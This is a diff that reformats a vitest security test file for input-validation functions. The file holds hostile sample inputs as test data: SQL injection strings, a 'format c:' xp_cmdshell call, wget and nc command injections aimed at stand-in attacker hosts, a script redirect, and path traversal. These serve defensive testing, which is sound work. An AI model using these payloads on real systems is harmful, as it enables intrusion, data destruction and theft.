@@ -4,12 +4,12 @@
  */
 
 import { describe, it, expect, beforeAll } from 'vitest';
-import { 
-  validateSearchQuery, 
-  validateTopicName, 
+import {
+  validateSearchQuery,
+  validateTopicName,
   escapeHtml,
   sanitizeInput,
-  ValidationDefaults
+  ValidationDefaults,
 } from '../src/utils/input-validation.js';
 
 // Mock the logger to prevent initialization errors in tests
@@ -43,8 +43,12 @@ describe('Input Security Validation', () => {
     it('should handle edge cases safely', () => {
       expect(escapeHtml('')).toBe('');
       expect(escapeHtml('normal text')).toBe('normal text');
-      expect(escapeHtml('text with "quotes" and \'apostrophes\'')).not.toContain('"');
-      expect(escapeHtml('text with "quotes" and \'apostrophes\'')).not.toContain("'");
+      expect(
+        escapeHtml('text with "quotes" and \'apostrophes\'')
+      ).not.toContain('"');
+      expect(
+        escapeHtml('text with "quotes" and \'apostrophes\'')
+      ).not.toContain("'");
     });
   });
 
@@ -54,13 +58,16 @@ describe('Input Security Validation', () => {
         "'; DROP TABLE users; --",
         "1'; DELETE FROM users WHERE 't' = 't",
         "'; EXEC xp_cmdshell('format c:'); --",
-        "UNION SELECT username, password FROM users--",
+        'UNION SELECT username, password FROM users--',
         "admin'--",
         "' OR '1'='1",
       ];
 
       sqlInjections.forEach(injection => {
-        const result = sanitizeInput(injection, ValidationDefaults.SEARCH_QUERY);
+        const result = sanitizeInput(
+          injection,
+          ValidationDefaults.SEARCH_QUERY
+        );
         expect(result.isValid).toBe(false);
         expect(result.violations.length).toBeGreaterThan(0);
         expect(result.sanitized).not.toContain('DROP');
@@ -79,7 +86,10 @@ describe('Input Security Validation', () => {
       ];
 
       commandInjections.forEach(injection => {
-        const result = sanitizeInput(injection, ValidationDefaults.SEARCH_QUERY);
+        const result = sanitizeInput(
+          injection,
+          ValidationDefaults.SEARCH_QUERY
+        );
         expect(result.isValid).toBe(false);
         expect(result.violations.length).toBeGreaterThan(0);
         expect(result.sanitized).not.toContain('rm -rf');
@@ -97,7 +107,10 @@ describe('Input Security Validation', () => {
       ];
 
       pathTraversals.forEach(traversal => {
-        const result = sanitizeInput(traversal, ValidationDefaults.SEARCH_QUERY);
+        const result = sanitizeInput(
+          traversal,
+          ValidationDefaults.SEARCH_QUERY
+        );
         expect(result.isValid).toBe(false);
         expect(result.violations.length).toBeGreaterThan(0);
         expect(result.sanitized).not.toContain('../');
@@ -114,7 +127,9 @@ describe('Input Security Validation', () => {
 
       bufferOverflows.forEach(overflow => {
         const result = sanitizeInput(overflow, ValidationDefaults.SEARCH_QUERY);
-        expect(result.sanitized.length).toBeLessThanOrEqual(ValidationDefaults.SEARCH_QUERY.maxLength);
+        expect(result.sanitized.length).toBeLessThanOrEqual(
+          ValidationDefaults.SEARCH_QUERY.maxLength
+        );
         if (overflow.includes('<script>')) {
           expect(result.violations.length).toBeGreaterThan(0);
         }
@@ -162,7 +177,7 @@ describe('Input Security Validation', () => {
         '<script>document.location="http://attacker.com/"</script>',
         'ADHD" OR 1=1--',
         'focus; wget http://malicious.com/payload.sh',
-        'ADHD\' UNION SELECT password FROM users--',
+        "ADHD' UNION SELECT password FROM users--",
         'x'.repeat(1000), // Too long
       ];
 
@@ -177,9 +192,11 @@ describe('Input Security Validation', () => {
       // Create a query with too many words
       const complexQuery = Array(60).fill('word').join(' ');
       const result = validateSearchQuery(complexQuery);
-      
+
       expect(result.isValid).toBe(false);
-      expect(result.violations.some(v => v.includes('too many words'))).toBe(true);
+      expect(result.violations.some(v => v.includes('too many words'))).toBe(
+        true
+      );
     });
 
     it('should reject empty queries after sanitization', () => {
@@ -220,7 +237,7 @@ describe('Input Security Validation', () => {
     it('should reject malicious topic names', () => {
       const maliciousTopics = [
         '<iframe src="javascript:alert(1)">',
-        'Math\'; DROP TABLE courses; --',
+        "Math'; DROP TABLE courses; --",
         'Science && wget malicious.com',
         'History | nc attacker.com 4444',
         'x'.repeat(200), // Too long
@@ -250,22 +267,18 @@ describe('Input Security Validation', () => {
     });
 
     it('should reject topics that are too short after sanitization', () => {
-      const tooShort = [
-        'A',
-        '<>',
-        ' ',
-        ';;',
-      ];
+      const tooShort = ['A', '<>', ' ', ';;'];
 
       tooShort.forEach(topic => {
         const result = validateTopicName(topic);
         expect(result.isValid).toBe(false);
         // Check if ANY violation mentions length requirement or invalid content
-        const hasExpectedViolation = result.violations.some(v => 
-          v.includes('at least 2 characters') || 
-          v.includes('invalid characters') ||
-          v.includes('HTML entities') ||
-          v.includes('Dangerous pattern')
+        const hasExpectedViolation = result.violations.some(
+          v =>
+            v.includes('at least 2 characters') ||
+            v.includes('invalid characters') ||
+            v.includes('HTML entities') ||
+            v.includes('Dangerous pattern')
         );
         expect(hasExpectedViolation).toBe(true);
       });
@@ -283,7 +296,7 @@ describe('Input Security Validation', () => {
       unicodeAttacks.forEach(attack => {
         const searchResult = validateSearchQuery(attack);
         const topicResult = validateTopicName(attack);
-        
+
         expect(searchResult.isValid).toBe(false);
         expect(topicResult.isValid).toBe(false);
       });
@@ -300,13 +313,15 @@ describe('Input Security Validation', () => {
       controlCharAttacks.forEach(attack => {
         const searchResult = validateSearchQuery(attack);
         const topicResult = validateTopicName(attack);
-        
+
         // All control character attacks should be flagged as invalid
         expect(searchResult.isValid).toBe(false);
         expect(topicResult.isValid).toBe(false);
-        
+
         // And should not contain control chars in sanitized output
+        // eslint-disable-next-line no-control-regex
         expect(searchResult.sanitized).not.toMatch(/[\x00-\x1f\x7f-\x9f]/);
+        // eslint-disable-next-line no-control-regex
         expect(topicResult.sanitized).not.toMatch(/[\x00-\x1f\x7f-\x9f]/);
       });
     });
@@ -322,7 +337,7 @@ describe('Input Security Validation', () => {
       mixedAttacks.forEach(attack => {
         const searchResult = validateSearchQuery(attack);
         const topicResult = validateTopicName(attack);
-        
+
         expect(searchResult.isValid).toBe(false);
         expect(topicResult.isValid).toBe(false);
         expect(searchResult.violations.length).toBeGreaterThan(0);
